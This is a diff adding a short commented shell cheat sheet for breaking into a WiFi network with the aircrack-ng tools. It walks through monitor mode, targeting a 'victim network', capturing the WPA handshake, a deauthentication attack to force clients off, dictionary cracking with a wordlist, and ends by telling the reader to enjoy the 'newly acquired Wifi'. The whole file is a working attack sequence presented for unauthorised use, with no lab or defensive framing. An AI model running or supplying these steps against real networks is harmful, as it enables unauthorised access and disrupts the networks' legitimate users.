@@ -1,0 +1,32 @@
+# First you need to put the network adapter into monitor mode.
+
+iwconfig
+
+sudo airmon-ng start # ADAPTOR NAME #
+
+# Identify Network you wish to attack
+
+sudo airodump-ng # ADAPTOR NAME #
+
+# Once you have identified the victim network, start capturing all the packets being transmitted on the network
+
+ sudo airodump-ng -w # FILENAME TO STORE EAPOL's IN # -c # CHANNEL THE AP OPERATES ON # --bssid # THE M.A.C ADDRESS OF THE NETWORK # # ADAPTER NAME #
+
+# Start A Deauthentication attack against THE NETWORK
+
+sudo aireplay-ng --deauth # NUMBER OF PACKETS TO SEND # -a # AP M.A.C ADDRESS # # ADAPTER NAME #
+
+# End the capture. Open it in WireShark to View the Network Traffic.
+
+wireshark # FILENAME TO STORE EAPOL's IN # 
+
+# Attempt to decrypt the handshake.
+
+aircrack-ng # FILENAME TO STORE EAPOL's IN # -w # SPECIFY LOCATION OF WORDLIST#
+
+# Stop Monitor mode.
+
+sudo airmon-ng stop # ADAPTER NAME #
+
+# Enjoy access to your Newly acquired Wifi!!!
+
